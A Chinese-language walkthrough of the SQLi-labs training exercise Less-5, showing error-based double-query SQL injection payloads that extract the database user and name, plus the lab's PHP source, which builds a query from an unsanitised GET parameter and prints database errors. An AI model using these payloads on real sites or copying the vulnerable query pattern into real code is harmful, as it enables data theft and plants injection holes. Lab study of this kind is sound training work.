# Less-5 **GET Double Query- Single Quotes- String**
TAG:字符型注入、报错注入、双查询注入  
## 漏洞利用
输入?id=1时，返回You are in………  
![less5_1](images\less5_1.png)  
输入?id=100时，无返回  
![less5_2](images\less5_2.png)  

页面名提示这个是双查询注入，但这种情况也可以进行盲注   
单独在字符后输入一个单引号，发现有报错，可以通过报错获取信息
![less5_3](images\less5_3.png)  

存在报错信息，但是不存在回显点，考虑进行双查询注入  

构造注入语句查询数据库用户  
payload:```?id=1' union select 1,count(*),concat((select user()),floor(rand()*2))as a from information_schema.tables group by a--+```  
有时候需要刷新几次才能出结果  
![less5_5](images\less5_5.png)  

构造语句获取数据库名  
payload:```?id=1' union select 1,count(*),concat((select database()),floor(rand()*2))as a from information_schema.tables group by a--+```  
![less5_6](images\less5_6.png)  

替换payload来达成不同的查询  
```?id=1' union select 1,count(*),concat((payload),floor(rand()*2))as a from information_schema.tables group by a--+```  

## 源码分析  
### less5源码： 
```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Less-5 Double Query- Single Quotes- String</title>
</head>

<body bgcolor="#000000">
<div style=" margin-top:60px;color:#FFF; font-size:23px; text-align:center">Welcome&nbsp;&nbsp;&nbsp;<font color="#FF0000"> Dhakkan </font><br>
<font size="3" color="#FFFF00">


<?php
//including the Mysql connect parameters.
include("../sql-connections/sql-connect.php");
error_reporting(0);
// take the variables
if(isset($_GET['id']))
{
$id=$_GET['id'];
//logging the connection parameters to a file for analysis.
$fp=fopen('result.txt','a');
fwrite($fp,'ID:'.$id."\n");
fclose($fp);

// connectivity 


$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

	if($row)
	{
  	echo '<font size="5" color="#FFFF00">';	
  	echo 'You are in...........';
  	echo "<br>";
    	echo "</font>";
  	}
	else 
	{
	
	echo '<font size="3" color="#FFFF00">';
	print_r(mysql_error());
	echo "</br></font>";	
	echo '<font color= "#0000ff" font size= 3>';	
	
	}
}
	else { echo "Please input the ID as parameter with numeric value";}

?>

</font> </div></br></br></br><center>
<img src="../images/Less-5.jpg" /></center>
</body>
</html>
```
### 漏洞点分析：  
```
<?php
    include("../sql-connections/sql-connect.php");
    error_reporting(0);
    if(isset($_GET['id'])){
        $id=$_GET['id'];
        $fp=fopen('result.txt','a');
        fwrite($fp,'ID:'.$id."\n"); 
        fclose($fp); 
        $sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
        $result=mysql_query($sql);
        $row = mysql_fetch_array($result);
        if($row){
  	        echo '<font size="5" color="#FFFF00">';	
  	        echo 'You are in...........';
  	        echo "<br>";
    	    echo "</font>";
        }
        else{
	        echo '<font size="3" color="#FFFF00">';
	        print_r(mysql_error());
	        echo "</br></font>";	
	        echo '<font color= "#0000ff" font size= 3>';	
	    }
    }
	else { echo "Please input the ID as parameter with numeric value";}
?>
``` 

这个less在对接受参数的处理与less1相同，但是并不会显示查询到的数据，也就是没有回显点  
通过分析代码与对页面实际操作可以发现，数据库操作的错误信息被输出到页面上，那就意味着可以进行报错注入  
构造一个双查询的注入语句就可以实现数据库信息的获取  